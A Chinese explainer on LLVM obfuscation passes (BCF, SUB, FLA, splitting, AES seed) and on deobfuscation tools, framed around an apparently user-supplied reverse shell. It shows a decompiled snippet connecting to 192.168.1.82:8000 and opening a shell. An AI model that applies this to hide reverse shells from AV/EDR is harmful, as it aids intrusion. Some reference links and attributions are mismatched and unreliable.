# LLVM Obfuscation 详解

## 一、什么是 LLVM Obfuscation

**LLVM Obfuscation** 是基于 **LLVM (Low Level Virtual Machine)** 编译器基础设施实现的代码混淆技术。它通过在编译器的 **中间表示** 层面对代码进行变换，使得生成的二进制程序难以被逆向工程分析。

### LLVM 编译器架构基础

```
┌─────────────────────────────────────────────────────────────┐
│                    Source Code (C/C++/Rust...)              │
└─────────────────────────────────────────────────────────────┘
                              │
                              ▼
┌─────────────────────────────────────────────────────────────┐
│                    Frontend (Clang/clang-cl)                │
│                  词法分析 → 语法分析 → 语义分析                 │
└─────────────────────────────────────────────────────────────┘
                              │
                              ▼
┌─────────────────────────────────────────────────────────────┐
│              LLVM IR (Intermediate Representation)          │
│         ┌─────────────────────────────────────────┐         │
│         │   ⭐ Obfuscation Passes 在此介入 ⭐      │         │
│         │   - Bogus Control Flow (BCF)            │         │
│         │   - Instruction Substitution (SUB)      │         │
│         │   - Control Flow Flattening (FLA)       │         │
│         │   - Basic Block Splitting               │         │
│         └─────────────────────────────────────────┘         │
└─────────────────────────────────────────────────────────────┘
                              │
                              ▼
┌─────────────────────────────────────────────────────────────┐
│                    Backend (Code Generator)                  │
│                   优化 → 机器码生成 → 链接                     │
└─────────────────────────────────────────────────────────────┘
                              │
                              ▼
┌─────────────────────────────────────────────────────────────┐
│                    Obfuscated Binary                         │
└─────────────────────────────────────────────────────────────┘
```

**为什么选择 LLVM IR 层面进行混淆？**

| 层面 | 优点 | 缺点 |
|------|------|------|
| **Source Code Level** | 简单易实现 | 容易被优化掉，依赖特定语言 |
| **LLVM IR Level** ✅ | 语言无关、平台无关、不会被轻易优化 | 实现复杂度中等 |
| **Binary Level** | 最接近最终产物 | 平台相关，实现最复杂 |

---

## 二、核心混淆技术详解

根据你提供的文件，编译选项中使用了以下混淆技术：

```
-mllvm -bcf -mllvm -bcf_prob=73 -mllvm -bcf_loop=1 
-mllvm -sub -mllvm -sub_loop=5 
-mllvm -fla 
-mllvm -split_num=5 
-mllvm -aesSeed=1234BEEFDEAD1234DEADBEEFDEAD1234
```

### 1. Bogus Control Flow (BCF) - 虚假控制流

#### 原理

BCF 通过在基本块中插入**永不执行**的死代码分支，迷惑反编译器和逆向工程师。

#### 技术实现

原始控制流：
```
┌──────────────┐
│  Basic Block │
│      A       │
└──────────────┘
        │
        ▼
┌──────────────┐
│  Basic Block │
│      B       │
└──────────────┘
```

混淆后控制流：
```
                ┌──────────────┐
                │  Basic Block │
                │      A       │
                └──────────────┘
                        │
              ┌─────────┴─────────┐
              │                   │
              ▼                   ▼
    ┌──────────────────┐  ┌──────────────────┐
    │   Bogus Block    │  │   True Branch    │
    │   (永远不执行)    │  │   (实际执行)      │
    └──────────────────┘  └──────────────────┘
              │                   │
              └─────────┬─────────┘
                        │
                        ▼
                ┌──────────────┐
                │  Basic Block │
                │      B       │
                └──────────────┘
```

#### 数学表达

对于原始基本块 $B_{orig}$，BCF 插入条件分支：

$$
B_{orig} \rightarrow \begin{cases} 
B_{true} & \text{if } (P \land \neg P) = \text{false} \\
B_{bogus} & \text{if } (P \land \neg P) = \text{true}
\end{cases}
$$

其中：
- $P$ 是一个不透明谓词
- $P \land \neg P$ 永远为 **false**，因此 $B_{bogus}$ 永不执行
- 但静态分析器难以判断这一点

#### 不透明谓词 类型

| 类型 | 表达式 | 值 | 说明 |
|------|--------|-----|------|
| **True Predicate** | $x \cdot (x + 1) \% 2 = 0$ | 永真 | 任意整数连续两数之积为偶数 |
| **False Predicate** | $x^2 < 0$ (for integer x) | 永假 | 整数平方非负 |
| **Unknown Predicate** | $x^2 + y^2 = z^2$ | 未知 | 依赖输入，难以静态分析 |

#### 参数说明

```
-mllvm -bcf              # 启用 BCF
-mllvm -bcf_prob=73      # 每个基本块被混淆的概率为 73%
-mllvm -bcf_loop=1       # 对每个基本块应用 BCF 的次数
```

---

### 2. Instruction Substitution (SUB) - 指令替换

#### 原理

将简单的算术/逻辑运算替换为**等价但更复杂**的指令序列。

#### 替换规则示例

**加法替换：**

$$a + b \rightarrow (a \oplus b) + 2 \cdot (a \land b)$$

验证：
- 设 $a = 5 = 0101_2$, $b = 3 = 0011_2$
- $a \oplus b = 0110_2 = 6$ (无进位加法)
- $a \land b = 0001_2 = 1$ (进位)
- $6 + 2 \times 1 = 8 = 5 + 3$ ✓

**减法替换：**

$$a - b \rightarrow (a \oplus b) - 2 \cdot (\neg a \land b)$$

**AND 替换：**

$$a \land b \rightarrow \neg(\neg a \lor \neg b)$$

或者使用算术运算：

$$a \land b \rightarrow ((a + b) - (a \oplus b)) \gg 1$$

**OR 替换：**

$$a \lor b \rightarrow (a + b) - (a \land b)$$

#### 代码层面示例

原始代码：
```c
int add(int a, int b) {
    return a + b;
}
```

混淆后可能变为：
```c
int add(int a, int b) {
    int x = a ^ b;
    int y = a & b;
    int z = x + (y << 1);  // 等价于 a + b
    return z;
}
```

#### 参数说明

```
-mllvm -sub              # 启用指令替换
-mllvm -sub_loop=5       # 每条指令替换 5 次
```

---

### 3. Control Flow Flattening (FLA) - 控制流平坦化

#### 原理

将程序的控制流图"压扁"，使所有基本块处于**同一层级**，通过一个**状态变量**控制执行顺序。

这是最强大的混淆技术之一！

#### 控制流变换

**原始 CFG (Control Flow Graph)：**

```
    ┌─────┐
    │ A   │ (Entry)
    └─────┘
        │
        ▼
    ┌─────┐
    │ B   │
    └─────┘
       / \
      /   \
  ┌─────┐ ┌─────┐
  │ C   │ │ D   │
  └─────┘ └─────┘
      \   /
       \ /
    ┌─────┐
    │ E   │ (Exit)
    └─────┘
```

**平坦化后的 CFG：**

```
                    ┌──────────────┐
                    │    Entry     │
                    │  state = 1   │
                    └──────────────┘
                           │
                           ▼
    ┌──────────────────────────────────────────────┐
    │              Dispatcher (分发器)              │
    │  while(true) {                               │
    │      switch(state) {                         │
    │          case 1: Block A; state = 2; break;  │
    │          case 2: Block B; state = rand();    │
    │                   break;  // 3 or 4          │
    │          case 3: Block C; state = 5; break;  │
    │          case 4: Block D; state = 5; break;  │
    │          case 5: Block E; return;            │
    │      }                                       │
    │  }                                           │
    └──────────────────────────────────────────────┘
```

#### LLVM IR 层面的实现

```llvm
; 原始 IR
define i32 @func(i32 %a, i32 %b) {
entry:
  %cmp = icmp sgt i32 %a, %b
  br i1 %cmp, label %then, label %else

then:
  %res1 = add i32 %a, %b
  br label %merge

else:
  %res2 = sub i32 %a, %b
  br label %merge

merge:
  %result = phi i32 [%res1, %then], [%res2, %else]
  ret i32 %result
}

; 平坦化后的 IR (简化版)
define i32 @func(i32 %a, i32 %b) {
entry:
  %state = alloca i32
  store i32 1, i32* %state
  br label %dispatcher

dispatcher:
  %s = load i32, i32* %state
  switch i32 %s, label %exit [
    i32 1, label %block_a
    i32 2, label %block_b
    i32 3, label %block_c
    i32 4, label %exit
  ]

block_a:
  ; ... some computation ...
  store i32 2, i32* %state
  br label %dispatcher

block_b:
  ; ... some computation ...
  store i32 3, i32* %state
  br label %dispatcher

; ... 更多基本块 ...
}
```

#### 状态变量编码

为了进一步增加复杂度，状态变量可以编码为：

$$
\text{next\_state} = f(\text{current\_state}, \text{context})
$$

其中 $f$ 可以是：
- 简单映射：$\text{state} = \text{hash}(\text{block\_id})$
- 非线性变换：$\text{state} = (\text{state} \times 31 + 17) \mod 2^{32}$
- AES 加密（使用 `-mllvm -aesSeed`）：

$$
\text{state}_{\text{enc}} = \text{AES}_{K}(\text{state}_{\text{plain}})
$$

---

### 4. Basic Block Splitting - 基本块分割

#### 原理

将一个基本块分割成多个小基本块，增加控制流复杂度。

#### 变换示例

**原始基本块：**
```c
// Basic Block 1
int x = a + b;
int y = x * 2;
int z = y - 5;
return z;
```

**分割后：**
```c
// Basic Block 1
int x = a + b;
goto BB2;

// Basic Block 2
int y = x * 2;
goto BB3;

// Basic Block 3
int z = y - 5;
return z;
```

#### 参数说明

```
-mllvm -split_num=5      # 每个基本块分割成 5 个子块
```

---

### 5. AES Seed - 状态变量加密

```
-mllvm -aesSeed=1234BEEFDEAD1234DEADBEEFDEAD1234
```

使用 **AES (Advanced Encryption Standard)** 加密状态变量，使 FLA 的状态转换更难分析。

#### AES 加密在 FLA 中的应用

```
原始状态: state = 3
     │
     ▼
┌─────────────────┐
│  AES Encrypt    │
│  Key = Seed     │
└─────────────────┘
     │
     ▼
加密状态: state_enc = 0xDEADBEEF...
     │
     ▼
  存储到变量
```

在分发器中：
```c
switch(AES_decrypt(state_variable, key)) {
    case 1: goto block_1;
    case 2: goto block_2;
    // ...
}
```

---

## 三、完整混淆流程示例

### 结合所有技术的综合效果

原始函数：
```c
int calculate(int a, int b) {
    int sum = a + b;
    if (sum > 100) {
        return sum * 2;
    } else {
        return sum / 2;
    }
}
```

经过所有混淆后的伪代码（简化）：

```c
int calculate(int a, int b) {
    int state = AES_encrypt(1, AES_KEY);
    
    while (1) {
        int decrypted_state = AES_decrypt(state, AES_KEY);
        
        switch (decrypted_state) {
            case 1: {
                // SUB: a + b 变换
                int t1 = a ^ b;
                int t2 = a & b;
                int sum = t1 + (t2 << 1);
                
                // BCF: 插入虚假分支
                if (opaque_predicate()) {
                    // 死代码
                    sum = sum * 0 + 999;
                }
                
                // 分割后跳转到下一块
                state = AES_encrypt(2, AES_KEY);
                break;
            }
            case 2: {
                // BCF + FLA 混合
                if (sum > 100 && opaque_false()) {
                    state = AES_encrypt(3, AES_KEY);
                } else if (sum > 100) {
                    state = AES_encrypt(3, AES_KEY);
                } else {
                    state = AES_encrypt(4, AES_KEY);
                }
                break;
            }
            case 3: {
                // SUB: sum * 2
                int result = sum + sum;
                return result;
            }
            case 4: {
                // SUB: sum / 2
                int result = sum >> 1;
                return result;
            }
        }
    }
}
```

---

## 四、混淆效果对比分析

根据你提供的文件数据：

| 指标 | 原始编译 | LLVM Obfuscated |
|------|---------|-----------------|
| **文件大小** | 19 KB | **1,886 KB** (增长 ~100 倍) |
| **代码可读性** | 高 | 极低 |
| **反编译难度** | 简单 | 极其困难 |
| **静态分析** | 容易 | 几乎不可能 |
| **动态分析** | 较容易 | 困难（但可行） |

### IDA Pro 反编译对比

**原始二进制：**
```c
int main() {
    SOCKET sock = connectToHost("192.168.1.82", 8000);
    shell(sock);
    closesocket(sock);
    return 0;
}
```

**混淆后二进制（IDA 反编译结果）：**
```c
// 大量嵌套 switch-case
// 无意义的变量名
// 逻辑几乎不可理解
int __fastcall main() {
    int v0;
    int v1;
    int state;
    
    state = sub_4A3B20(1);
    while (1) {
        v0 = sub_4A3C10(state);
        switch (v0) {
            case 0x1F3A:
                v1 = sub_4B2000(v0 ^ v1);
                state = sub_4A3B20(v1 * 31 + 17);
                break;
            case 0x2D4B:
                // ... 几百行 ...
                break;
            // ... 数百个 case ...
        }
    }
}
```

---

## 五、LLVM Obfuscator 项目

### 主要实现项目

| 项目 | GitHub | LLVM 版本 | 状态 |
|------|--------|-----------|------|
| **Obfuscator-LLVM** | https://github.com/obfuscator-llvm/obfuscator | LLVM 4.0 | 维护中 |
| **OLLVM-16** | https://github.com/wwh1004/ollvm-16 | LLVM 16.0 | 活跃 |
| **Armariris** | https://github.com/GoSSIP-SJTU/Armariris | LLVM 6.0+ | 学术项目 |
| **Hikari** | https://github.com/HikariObfuscator/Hikari | LLVM 9.0+ | 功能最丰富 |

### Hikari 增强功能

Hikari 在原始 OLLVM 基础上增加了：

1. **String Encryption** - 字符串加密
2. **Indirect Branch** - 间接跳转
3. **Anti-Debugging** - 反调试
4. **Anti-Hooking** - 反 Hook

---

## 六、局限性与对抗方法

### 局限性

| 局限 | 说明 |
|------|------|
| **文件体积膨胀** | 混淆后文件可能增大 10-100 倍 |
| **性能下降** | 运行时开销增加 10-50% |
| **非银弹** | 不能完全阻止逆向，只是增加难度 |
| **可检测性** | 特征可被 AV/EDR 检测 |

### 去混淆方法

#### 1. 符号执行

使用工具如 **angr**, **Triton** 自动求解不透明谓词：

```python
import angr
import claripy

proj = angr.Project("obfuscated.exe")
state = proj.factory.entry_state()

# 符号执行求解
simgr = proj.factory.simulation_manager(state)
simgr.explore(find=lambda s: "target" in s.posix.dumps(2))
```

#### 2. 控制流图恢复

针对 FLA 的去混淆算法：

```
Algorithm: Deflattening
───────────────────────────────────────
Input: Obfuscated CFG G = (V, E)
Output: Original CFG G' = (V', E')

1. Identify dispatcher node (具有最多入边/出边的节点)
2. Collect all basic blocks
3. For each block B:
   - Symbolically execute to find:
     * Predecessor states
     * Successor states
4. Reconstruct original CFG edges
5. Remove dispatcher and state variable
───────────────────────────────────────
```

#### 3. 模式匹配

识别 OLLVM 特征：
- 大量 `switch-case` 结构
- 不透明谓词模式：`(x * (x + 1)) & 1 == 0`
- AES S-Box 特征

---

## 七、实践建议

### 混淆策略选择

```
┌─────────────────────────────────────────────────────┐
│                  混淆强度 vs 成本                    │
├─────────────────────────────────────────────────────┤
│                                                     │
│  强度    BCF    SUB    FLA    Split    总开销       │
│  ─────────────────────────────────────────────      │
│  低      ❌     ✅      ❌     ❌       +10%        │
│  中      ✅     ✅      ❌     ✅       +30%        │
│  高      ✅     ✅      ✅     ✅       +100%       │
│  极高    ✅✅    ✅✅     ✅     ✅✅      +500%       │
│                                                     │
└─────────────────────────────────────────────────────┘
```

### 推荐配置

```bash
# 平衡配置（推荐用于生产环境）
-mllvm -sub -mllvm -sub_loop=3 
-mllvm -bcf -mllvm -bcf_prob=50 
-mllvm -fla

# 高强度配置（用于安全关键代码）
-mllvm -sub -mllvm -sub_loop=5 
-mllvm -bcf -mllvm -bcf_prob=80 -mllvm -bcf_loop=2
-mllvm -fla 
-mllvm -split_num=3
```

---

## 八、参考资源

### 学术论文

1. **"Lobotomy: An obfuscation toolkit for LLVM"** - Junod et al., 2015
   - 链接: https://doi.org/10.1109/ARES.2015.48

2. **"Control Flow Flattening"** - Wang et al.
   - 经典 FLA 论文

3. **"Code Obfuscation Against Symbolic Execution Attacks"** - Banescu et al., 2016
   - 链接: https://doi.org/10.1145/2995306

### 开源项目

- **OLLVM-16**: https://github.com/wwh1004/ollvm-16
- **Hikari Obfuscator**: https://github.com/HikariObfuscator/Hikari
- **Armariris**: https://github.com/GoSSIP-SJTU/Armariris
- **Flirt**: https://github.com/Antid0teCom/flare-ida (去混淆工具)

### 去混淆工具

- **deflat**: https://github.com/P4nda0s/deflat
- **D-810**: https://github.com/ANSSI-FR/SecuML
- **angr**: https://angr.io/

### 相关教程

- **Bordergate LLVM Obfuscation**: https://www.bordergate.co.uk/llvm-obfuscation/
- **N1ght0wl OLLVM Series**: 多篇系列教程

---

## 总结

**LLVM Obfuscation** 通过在编译器 IR 层面实施多种混淆技术（BCF、SUB、FLA、Split），有效提升逆向工程难度。根据你的文件，使用 OLLVM 编译的 reverse shell 从 19KB 膨胀到 1,886KB，这直观展示了混淆的"代价"——以空间换安全。

核心要点：
1. **BCF** 用不透明谓词插入死代码分支
2. **SUB** 用等价但复杂的指令序列替换简单运算
3. **FLA** 用状态机压扁控制流图
4. **AES Seed** 加密状态变量增强 FLA 安全性

混淆不是银弹，但能显著增加攻击者成本，是软件保护的重要手段之一。